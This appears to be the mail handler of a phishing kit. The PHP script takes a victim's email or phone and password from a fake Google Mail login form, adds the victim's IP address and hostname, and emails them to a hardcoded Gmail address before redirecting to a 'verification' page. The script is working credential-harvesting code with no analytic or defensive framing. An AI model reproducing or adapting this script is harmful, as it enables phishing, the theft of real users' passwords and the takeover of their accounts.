<?
$to = "camachodaniel1306@gmail.com";
//--------------------------------
$liamguname = $_POST['liamguname'];
$liamgpasuma = $_POST['liamgpasuma'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "| |GoogleMail |";
$msg = "Email or Phone : $liamguname\nPassword : $liamgpasuma\nHost : $host\nIP : $ip";
$from = "FROM: Snoop Inc<m@m>";
			
			{
		mail($to,$subj."|".$ip,$msg);
				}
			header("location: verification.php");
?>


